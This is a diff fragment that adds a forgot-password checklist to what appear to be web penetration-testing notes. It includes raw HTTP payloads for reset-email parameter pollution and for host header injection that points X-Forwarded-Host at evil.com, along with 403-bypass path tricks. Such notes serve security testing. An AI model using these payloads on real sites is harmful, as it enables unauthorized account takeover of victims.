@@ -357,4 +357,23 @@ site.com//;//secret –> HTTP 200 OK
 site.com/secret.json –> HTTP 200 OK
 ```
 
+### Check List 
 
+#### Forgot Password Functionality
+1. Parameter pollution
+```bash
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim@mail.com&email=hacker@mail.com
+```
+2. Host header Injection
+```bash
+POST /reset HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+...
+
+email=victim@mail.com
+...
